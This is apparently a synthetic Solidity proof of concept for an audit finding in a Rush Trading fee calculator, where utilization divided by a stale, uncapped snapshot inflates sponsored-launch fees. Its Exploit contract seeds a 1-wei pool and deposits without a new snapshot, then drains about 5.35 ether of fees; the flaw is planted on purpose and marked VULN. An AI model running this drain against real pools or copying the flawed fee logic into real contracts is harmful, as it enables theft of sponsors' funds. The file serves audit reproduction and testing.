// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

/*  Rush Trading FeeCalculator.calculateFee (Hexens RUSH1-8, #56661).
    SYNTHETIC, cheatcode-free.
    Utilization is (outstanding + new) * 1e18 / snapshotTotal, with no cap.
    Default curve: base 31709791983, optimal 0.6e18, slope1 317097919, slope2 23782343987.
    Snapshot stays 1 wei after a 1 ether deposit. A sponsored launch of the
    minimum 0.00001 ether for 1 second then bills 5945585996749963533 wei
    (about 5.945586 ether). A fresh snapshot bills 317097 wei.
    The liquidity-pool share of the inflated fee is 5351027397074967180 wei.
    The attacker, who owns the fresh deposit, withdraws 5351027397074967174 wei
    of that share (6 wei stays with the 1 wei seed share). */

contract Weth {
    string public constant name = "Wrapped Ether";
    string public constant symbol = "WETH";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) internal _bal;
    mapping(address => mapping(address => uint256)) internal _allow;

    function balanceOf(address account) external view returns (uint256) {
        return _bal[account];
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return _allow[owner][spender];
    }

    function mint(address to, uint256 amount) external {
        _bal[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _allow[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _move(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = _allow[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) _allow[from][msg.sender] = allowed - amount;
        _move(from, to, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        require(_bal[from] >= amount, "bal");
        _bal[from] -= amount;
        _bal[to] += amount;
    }
}

contract FeeCalculator {
    uint256 public constant BASE_FEE_RATE = 31_709_791_983;
    uint256 public constant OPTIMAL_UTILIZATION_RATIO = 0.6e18;
    uint256 public constant RATE_SLOPE_1 = 317_097_919;
    uint256 public constant RATE_SLOPE_2 = 23_782_343_987;
    uint256 public constant MAX_EXCESS_UTILIZATION_RATIO = 1e18 - 0.6e18;

    uint256 public lastUtilization;
    uint256 public lastFeeRate;
    uint256 public lastTotalFee;

    struct Params {
        uint256 duration;
        uint256 newLiquidity;
        uint256 outstandingLiquidity;
        uint256 reserveFactor;
        uint256 totalLiquidity;
    }

    function calculateFee(Params calldata params) external returns (uint256 totalFee, uint256 reserveFee) {
        uint256 feeRate = BASE_FEE_RATE;
        lastUtilization = _mulDiv(params.outstandingLiquidity + params.newLiquidity, 1e18, params.totalLiquidity); // @> VULN: snapshot total is the divisor, and the ratio is not capped at 1e18
        uint256 utilizationRatio = lastUtilization;

        if (utilizationRatio > OPTIMAL_UTILIZATION_RATIO) {
            feeRate += RATE_SLOPE_1
                + _mulDiv(RATE_SLOPE_2, utilizationRatio - OPTIMAL_UTILIZATION_RATIO, MAX_EXCESS_UTILIZATION_RATIO);
        } else {
            feeRate += _mulDiv(RATE_SLOPE_1, utilizationRatio, OPTIMAL_UTILIZATION_RATIO);
        }
        lastFeeRate = feeRate;

        totalFee = _mulDiv(feeRate * params.duration, params.newLiquidity, 1e18);
        reserveFee = _mulDiv(totalFee, params.reserveFactor, 1e18);
        lastTotalFee = totalFee;
    }

    function _mulDiv(uint256 x, uint256 y, uint256 d) internal pure returns (uint256) {
        return (x * y) / d;
    }
}

contract LiquidityPool {
    Weth public immutable asset;
    uint256 public totalAssets;
    uint256 public totalShares;
    uint256 public lastSnapshotTotalAssets;
    uint256 public outstandingAssets;
    uint256 public lastDeposit;
    mapping(address => uint256) internal _shares;

    constructor(Weth _asset) {
        asset = _asset;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _shares[account];
    }

    function seed(uint256 amount, address to) external {
        asset.transferFrom(msg.sender, address(this), amount);
        totalAssets = amount;
        totalShares = amount;
        _shares[to] = amount;
        lastSnapshotTotalAssets = amount;
        lastDeposit = amount;
    }

    function deposit(uint256 amount, address to) external returns (uint256 shares) {
        shares = (amount * totalShares) / totalAssets;
        asset.transferFrom(msg.sender, address(this), amount);
        totalAssets += amount;
        totalShares += shares;
        _shares[to] += shares;
        lastDeposit = amount;
    }

    function takeSnapshot() external {
        lastSnapshotTotalAssets = totalAssets;
    }

    function credit(uint256 amount) external {
        asset.transferFrom(msg.sender, address(this), amount);
        totalAssets += amount;
    }

    function withdraw(uint256 shares, address to) external returns (uint256 assetsOut) {
        assetsOut = (shares * totalAssets) / totalShares;
        _shares[msg.sender] -= shares;
        totalShares -= shares;
        totalAssets -= assetsOut;
        asset.transfer(to, assetsOut);
    }
}

contract SponsorRouter {
    uint256 public constant RESERVE_FACTOR = 0.1e18;
    uint256 public constant MIN_LIQUIDITY = 0.00001 ether;
    uint256 public constant MIN_DURATION = 1;

    Weth public immutable weth;
    FeeCalculator public immutable fees;
    LiquidityPool public immutable pool;

    uint256 public sponsorBalance;
    uint256 public sponsorPaid;
    uint256 public poolFeePaid;
    uint256 public reserveHeld;
    uint256 public staleSnapshot;

    constructor(Weth _weth, FeeCalculator _fees, LiquidityPool _pool) {
        weth = _weth;
        fees = _fees;
        pool = _pool;
    }

    function fundSponsor(uint256 amount) external {
        weth.transferFrom(msg.sender, address(this), amount);
        sponsorBalance += amount;
    }

    function chargeSponsored(uint256 newLiquidity, uint256 duration) external returns (uint256 totalFee) {
        uint256 snap = pool.lastSnapshotTotalAssets();
        staleSnapshot = snap;
        uint256 reserveFee;
        (totalFee, reserveFee) = fees.calculateFee(
            FeeCalculator.Params({
                duration: duration,
                newLiquidity: newLiquidity,
                outstandingLiquidity: pool.outstandingAssets(),
                reserveFactor: RESERVE_FACTOR,
                totalLiquidity: snap
            })
        );
        require(sponsorBalance >= totalFee, "sponsor");
        sponsorBalance -= totalFee;
        sponsorPaid = totalFee;
        uint256 poolFee = totalFee - reserveFee;
        poolFeePaid = poolFee;
        reserveHeld += reserveFee;
        weth.approve(address(pool), poolFee);
        pool.credit(poolFee);
    }
}

contract Exploit {
    uint256 public constant DEPOSIT = 1 ether;
    uint256 public constant SPONSOR_BUDGET = 10 ether;
    uint256 public constant SEED = 1;
    address public constant SEED_HOLDER = address(0xdead);

    Weth public weth;
    FeeCalculator public fees;
    LiquidityPool public pool;
    SponsorRouter public router;

    uint256 public seenSnapshot;
    uint256 public utilization;
    uint256 public sponsorPaid;
    uint256 public attackerProfit;
    uint256 public sharesHeld;

    constructor() {
        weth = new Weth();
        fees = new FeeCalculator();
        pool = new LiquidityPool(weth);
        router = new SponsorRouter(weth, fees, pool);

        weth.mint(address(this), SEED);
        weth.approve(address(pool), SEED);
        pool.seed(SEED, SEED_HOLDER);
    }

    function run() external {
        seenSnapshot = pool.lastSnapshotTotalAssets();
        require(seenSnapshot == SEED, "snapshot");

        weth.mint(address(this), DEPOSIT);
        weth.approve(address(pool), DEPOSIT);
        sharesHeld = pool.deposit(DEPOSIT, address(this));
        require(pool.lastSnapshotTotalAssets() == SEED, "stale");
        require(sharesHeld == DEPOSIT, "shares");

        weth.mint(address(this), SPONSOR_BUDGET);
        weth.approve(address(router), SPONSOR_BUDGET);
        router.fundSponsor(SPONSOR_BUDGET);

        router.chargeSponsored(router.MIN_LIQUIDITY(), router.MIN_DURATION());
        utilization = fees.lastUtilization();
        sponsorPaid = router.sponsorPaid();
        require(utilization == 10 ** 31, "U");
        require(sponsorPaid == 5_945_585_996_749_963_533, "fee");

        uint256 got = pool.withdraw(sharesHeld, address(this));
        attackerProfit = got - DEPOSIT;
        require(attackerProfit == 5_351_027_397_074_967_174, "profit");
        weth.transfer(msg.sender, attackerProfit);
    }

    function runHonest() external {
        seenSnapshot = pool.lastSnapshotTotalAssets();
        weth.mint(address(this), DEPOSIT);
        weth.approve(address(pool), DEPOSIT);
        sharesHeld = pool.deposit(DEPOSIT, address(this));
        pool.takeSnapshot();
        require(pool.lastSnapshotTotalAssets() == DEPOSIT + SEED, "fresh");

        weth.mint(address(this), SPONSOR_BUDGET);
        weth.approve(address(router), SPONSOR_BUDGET);
        router.fundSponsor(SPONSOR_BUDGET);
        router.chargeSponsored(router.MIN_LIQUIDITY(), router.MIN_DURATION());

        utilization = fees.lastUtilization();
        sponsorPaid = router.sponsorPaid();
        require(utilization <= 1e18, "capped");
        require(sponsorPaid == 317_097, "honest fee");

        uint256 got = pool.withdraw(sharesHeld, address(this));
        attackerProfit = got - DEPOSIT;
        require(attackerProfit == 285_387, "honest profit");
        weth.transfer(msg.sender, attackerProfit);
    }
}
